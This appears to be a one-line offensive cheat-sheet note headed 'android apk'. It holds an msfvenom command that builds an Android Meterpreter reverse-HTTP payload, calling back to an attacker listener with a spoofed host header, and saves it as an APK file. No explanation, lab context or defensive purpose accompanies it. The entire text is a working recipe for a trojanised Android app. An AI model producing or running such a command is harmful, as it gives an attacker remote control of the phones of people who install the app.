===android apk=====
msfvenom -p android/meterpreter_reverse_http LHOST=192.168.1.56 LPORT=8099 HttpHostHeader=attacker1.com R>atram.apk

